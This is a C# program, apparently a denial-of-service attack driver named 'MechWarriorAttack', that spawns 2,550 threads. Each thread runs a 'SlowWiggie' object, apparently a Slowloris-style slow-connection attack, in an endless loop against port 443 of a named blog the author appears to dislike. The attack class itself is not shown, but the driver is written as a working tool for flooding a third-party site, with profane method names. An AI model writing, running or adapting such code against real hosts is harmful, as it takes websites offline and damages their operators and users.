using MechWarrior;
using System;
using System.Threading;

namespace MechWarriorAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello World!");
            CancellationTokenSource tsource = new();
            int SomePort = 443; //443 for https, 80 for http
            for (int i = 0; i < 2550; i++)
            {
                SlowWiggie state = new SlowWiggie("somebullshitblogthathates.com", SomePort, 3000, true)
                {
                    ThreadName = $"Test {i}",
                    Cancel = tsource.Token,


                };
                MechManager.AddWork(new WaitCallback(RunBoomer), state);
            }
    
   
            while (MechManager.WorkInProgress)
            {
                Thread.Sleep(1200);
                Console.Clear();
                foreach(var state in MechManager.RunningThreadStates)
                {
                    Console.WriteLine(state);
                }
          
            }

        }
        static void RunBoomer(object? stater)
        {
            var state = (MechState)stater;
            state.WorkStartTime = DateTime.Now;
            state.WorkStarted = true;
            while (true)
            {
                state.FuckEmThatsWhy();
            }
            state.Complete = true;
            state.Success = true;
        }
    }
}
